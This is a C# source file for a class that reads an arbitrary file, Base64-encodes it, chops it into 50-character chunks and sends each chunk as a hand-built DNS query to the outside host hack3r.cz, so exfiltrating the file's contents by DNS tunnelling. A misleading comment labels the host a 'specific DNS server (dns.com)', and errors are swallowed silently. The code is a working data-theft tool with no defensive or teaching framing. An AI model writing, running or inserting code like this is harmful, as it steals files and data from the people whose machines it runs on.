using System;
using System.IO;
using System.Net;
using System.Net.Sockets;

public class DnsSender
{
    private readonly string logFilePath;

    public DnsSender()
    {
        logFilePath = Path.Combine(Path.GetTempPath(), "error.dns");
    }

    public void Soubor(string filePath)
    {
        try
        {
            Log("Processing file: " + filePath);
            // Read file content and convert to Base64
            byte[] data = File.ReadAllBytes(filePath);
            string base64 = Convert.ToBase64String(data);

            // Split Base64 string into 50-character parts
            string[] parts = SplitString(base64, 50);

            // Generate DNS file name
            string dnsfile = Path.GetFileName(filePath).Replace(".", "-");

            // Send DNS requests
            SendDns("---START--- " + dnsfile + " ------.hack3r.cz");
            foreach (string part in parts)
            {
                string dns = part.Replace("=", "--R") + ".hack3r.cz";
                SendDns(dns);
            }
            SendDns("----END---- " + dnsfile + "------.hack3r.cz");
            Log("File processed successfully.");
        }
        catch (Exception ex)
        {
            Log("Error in Soubor: " + ex.Message);
        }
    }

    private string[] SplitString(string str, int chunkSize)
    {
        try
        {
            Log("Splitting string into chunks of size " + chunkSize);
            int length = str.Length;
            int chunkCount = (length + chunkSize - 1) / chunkSize;
            string[] chunks = new string[chunkCount];
            for (int i = 0; i < chunkCount; i++)
            {
                int start = i * chunkSize;
                int size = Math.Min(chunkSize, length - start);
                chunks[i] = str.Substring(start, size);
            }
            Log("String split successfully.");
            return chunks;
        }
        catch (Exception ex)
        {
            Log("Error in SplitString: " + ex.Message);
            throw;
        }
    }

    private void SendDns(string dnsRequest)
    {
        try
        {
            Log("Resolving DNS request: " + dnsRequest);

            // Use a specific DNS server (dns.com)
            string dnsServer = "hack3r.cz";
            IPAddress[] addresses = Dns.GetHostAddresses(dnsServer);
            IPEndPoint dnsEndpoint = new IPEndPoint(addresses[0], 53);

            using (UdpClient dnsClient = new UdpClient())
            {
                dnsClient.Connect(dnsEndpoint);

                // Construct a simple DNS query
                byte[] query = BuildDnsQuery(dnsRequest);
                dnsClient.Send(query, query.Length);

                // Optionally receive response
                IPEndPoint remoteEndpoint = null;
                byte[] response = dnsClient.Receive(ref remoteEndpoint);
                Log("DNS request sent successfully. Response received.");
            }
        }
        catch (Exception ex)
        {
            Log("Error in SendDns: " + ex.Message);
        }
    }

    private byte[] BuildDnsQuery(string dnsRequest)
    {
        try
        {
            Log("Building DNS query for: " + dnsRequest);

            // DNS query header
            byte[] header = new byte[12];
            Random random = new Random();
            ushort transactionId = (ushort)random.Next(ushort.MinValue, ushort.MaxValue);
            header[0] = (byte)(transactionId >> 8); // Transaction ID (high byte)
            header[1] = (byte)(transactionId & 0xFF); // Transaction ID (low byte)
            header[2] = 0x01; // Flags (standard query)
            header[3] = 0x00;
            header[4] = 0x00; // Questions (high byte)
            header[5] = 0x01; // Questions (low byte)
            header[6] = 0x00; // Answer RRs
            header[7] = 0x00;
            header[8] = 0x00; // Authority RRs
            header[9] = 0x00;
            header[10] = 0x00; // Additional RRs
            header[11] = 0x00;

            // DNS query question
            string[] labels = dnsRequest.Split('.');
            MemoryStream questionStream = new MemoryStream();
            foreach (string label in labels)
            {
                byte[] labelBytes = System.Text.Encoding.ASCII.GetBytes(label);
                questionStream.WriteByte((byte)labelBytes.Length);
                questionStream.Write(labelBytes, 0, labelBytes.Length);
            }
            questionStream.WriteByte(0x00); // End of QNAME
            questionStream.WriteByte(0x00); // QTYPE (high byte)
            questionStream.WriteByte(0x01); // QTYPE (A record)
            questionStream.WriteByte(0x00); // QCLASS (high byte)
            questionStream.WriteByte(0x01); // QCLASS (IN)

            // Combine header and question
            byte[] question = questionStream.ToArray();
            byte[] query = new byte[header.Length + question.Length];
            Buffer.BlockCopy(header, 0, query, 0, header.Length);
            Buffer.BlockCopy(question, 0, query, header.Length, question.Length);

            Log("DNS query built successfully.");
            return query;
        }
        catch (Exception ex)
        {
            Log("Error in BuildDnsQuery: " + ex.Message);
            throw;
        }
    }

    private void Log(string message)
    {
        try
        {
            File.AppendAllText(logFilePath, DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") + ": " + message + Environment.NewLine);
        }
        catch
        {
            // Silently handle logging errors
        }
    }
}
